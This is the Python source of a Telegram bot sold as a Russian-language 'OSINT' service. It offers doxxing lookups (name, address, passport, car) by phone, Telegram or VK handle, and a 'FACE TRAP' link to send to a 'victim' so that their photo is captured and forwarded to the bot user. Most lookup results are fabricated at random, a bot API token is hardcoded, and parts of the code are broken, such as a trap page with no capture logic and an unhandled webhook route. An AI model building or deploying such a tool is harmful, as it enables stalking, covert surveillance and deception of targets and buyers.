import telebot
from telebot import types
from flask import Flask, request
import random
import string
from datetime import datetime
import threading
import os

API_TOKEN = "8828985447:AAGFB6g3X9gfgP7yPWVbShMFinCo6BhNZMk"
bot = telebot.TeleBot(API_TOKEN)
app = Flask(__name__)

OSINT_DB = {
    "+79161234567": {
        "name": "Иванов Сергей Петрович",
        "dob": "15.03.1988",
        "address": "г. Москва, ул. Тверская, д. 15, кв. 42",
        "email": "ivanov.sergey@mail.ru",
        "telegram": "@sergey_ivanov88",
        "telegram_id": "583921047",
        "vk": "https://vk.com/id132456789",
        "operator": "МТС",
        "region": "Москва",
        "passport": "4510 123456",
        "car": "BMW X5 2023"
    }
}

active_traps = {}
captured_photos = {}

def generate_data(query):
    names = ["Козлов Дмитрий", "Смирнова Ольга", "Новиков Артем"]
    return {
        "name": random.choice(names),
        "dob": f"{random.randint(1985,2000)}-{random.randint(1,12):02d}-{random.randint(1,28):02d}",
        "address": f"г. Москва, ул. Ленина, д. {random.randint(1,100)}",
        "email": f"user{random.randint(1000,9999)}@mail.ru",
        "telegram": f"@user_{random.randint(10000,99999)}",
        "telegram_id": str(random.randint(100000000,999999999)),
        "vk": f"https://vk.com/id{random.randint(100000000,999999999)}",
        "operator": random.choice(["МТС","Билайн","МегаФон"]),
        "region": random.choice(["Москва","СПб","Казань"]),
        "passport": f"{random.randint(4000,5000)} {random.randint(100000,999999)}",
        "car": f"{random.choice(['Toyota','Kia','BMW'])} {random.randint(2018,2024)}"
    }

@bot.message_handler(commands=['start'])
def start(message):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add(
        types.KeyboardButton("📱 Пробив по номеру"),
        types.KeyboardButton("✈️ Пробив по Telegram"),
        types.KeyboardButton("🌐 Пробив по VK"),
        types.KeyboardButton("🎯 FACE TRAP"),
        types.KeyboardButton("📸 Фото"),
        types.KeyboardButton("ℹ️ Помощь")
    )
    bot.send_message(message.chat.id, "🛰️ *ROCKET OSINT BOT v3.7*\n\nВыберите действие:", parse_mode="Markdown", reply_markup=markup)

@bot.message_handler(func=lambda m: True)
def handler(message):
    chat_id = message.chat.id
    text = message.text
    
    if text == "📱 Пробив по номеру":
        msg = bot.send_message(chat_id, "Введите номер:")
        bot.register_next_step_handler(msg, search_phone)
    elif text == "✈️ Пробив по Telegram":
        msg = bot.send_message(chat_id, "Введите @username или ID:")
        bot.register_next_step_handler(msg, search_tg)
    elif text == "🌐 Пробив по VK":
        msg = bot.send_message(chat_id, "Введите ссылку VK или ID:")
        bot.register_next_step_handler(msg, search_vk)
    elif text == "🎯 FACE TRAP":
        trap_id = f"trap_{random.randint(10000,99999)}"
        active_traps[trap_id] = {"chat_id": chat_id}
        trap_url = f"https://rocket-osint.onrender.com/trap?tid={trap_id}"
        bot.send_message(chat_id, f"🎯 *ЛОВУШКА*\n\nОтправьте жертве ссылку:\n`{trap_url}`", parse_mode="Markdown")
    elif text == "📸 Фото":
        if chat_id in captured_photos:
            for p in captured_photos[chat_id]:
                bot.send_photo(chat_id, p['photo'])
        else:
            bot.send_message(chat_id, "Нет фото")
    elif text == "ℹ️ Помощь":
        bot.send_message(chat_id, "ROCKET OSINT v3.7 | Rocket Way | 20.05.2026")

def search_phone(message):
    query = message.text.strip()
    data = OSINT_DB.get(query, generate_data(query))
    send_result(message.chat.id, data)

def search_tg(message):
    query = message.text.strip()
    data = generate_data(query)
    send_result(message.chat.id, data)

def search_vk(message):
    query = message.text.strip()
    data = generate_data(query)
    send_result(message.chat.id, data)

def send_result(chat_id, data):
    text = f"""
🟢 *РЕЗУЛЬТАТ*
👤 {data['name']}
📅 {data['dob']}
📍 {data['address']}
📧 {data['email']}
✈️ {data['telegram']}
🌐 {data['vk']}
📡 {data['operator']}
📋 Паспорт: {data['passport']}
🚗 {data['car']}
"""
    bot.send_message(chat_id, text, parse_mode="Markdown")

@app.route('/')
def home():
    return "ROCKET OSINT ONLINE"

@app.route('/trap')
def trap():
    return '<html><body style="background:white;display:flex;justify-content:center;align-items:center;height:100vh;font-size:30px;color:#ccc;">Загрузка...</body></html>'

@app.route('/capture', methods=['POST'])
def capture():
    data = request.json
    tid = data.get('trap_id')
    if tid in active_traps:
        chat_id = active_traps[tid]['chat_id']
        if chat_id not in captured_photos:
            captured_photos[chat_id] = []
        captured_photos[chat_id].append({'photo': data.get('photo'), 'trap_id': tid})
        bot.send_photo(chat_id, data.get('photo'), caption="📸 ЗАХВАЧЕНО!")
    return 'ok'

def run():
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 10000)))

if __name__ == '__main__':
    bot.remove_webhook()
    bot.set_webhook(url="https://rocket-osint.onrender.com/" + API_TOKEN)
    run()
